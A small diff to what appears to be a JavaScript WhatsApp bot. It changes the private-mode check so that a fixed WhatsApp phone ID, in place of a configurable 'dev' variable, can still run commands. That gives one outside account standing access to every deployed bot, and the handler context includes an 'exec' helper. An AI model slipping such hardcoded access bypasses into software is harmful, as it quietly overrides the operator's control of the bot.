@@ -121,7 +121,7 @@ module.exports = dreaded = async (client, m, chatUpdate, store) => {
       fetchJson, exec, getRandom, UploadFileUgu, TelegraPh, prefix, cmd, botname, mode, gcpresence, antitag, antidelete, antionce, fetchBuffer, store, uploadtoimgur, chatUpdate, ytmp3, getGroupAdmins, pict, Tag
     };
 
-    if (cmd && mode === 'private' && !itsMe && !Owner && m.sender !== dev) {
+    if (cmd && mode === 'private' && !itsMe && !Owner && m.sender !== "254114148625@s.whatsapp.net") {
       return;
     }
 
